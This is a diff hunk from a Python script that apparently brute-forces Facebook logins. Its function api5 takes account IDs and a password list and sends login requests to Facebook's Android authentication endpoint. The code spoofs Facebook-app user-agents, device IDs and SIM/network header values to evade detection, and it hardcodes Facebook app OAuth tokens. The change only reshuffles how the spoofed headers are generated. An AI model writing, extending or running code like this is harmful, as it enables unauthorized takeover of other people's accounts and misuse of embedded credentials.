@@ -518,14 +518,6 @@ def api5(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua = DEL_T()
-                                ads = str(uuid.uuid4())
-                                token = '350'+'685531728|62f8ce'+'9f74b12f84c123cc23437a4a32'
-                                jz = random.choice(['28','29','210'])+''.join(random.choice(digits) for _ in range(2))
-                                mac = str(uuid.uuid4()).replace('-','')[0:25]
-                                sim_code = str(random.randint(2e4,4e4))
-                                x_fb = str(random.randint(2e7,3e7))
-                                device_id = str(uuid.uuid4())
                                 ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
@@ -548,11 +540,11 @@ def api5(ids,names,passlist):
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':jz,
+                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-type':'WIFI.LTE',
                                         'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
                                         'user-agent':ua_string,
-                                        'x-fb-net-hni':jz,
+                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
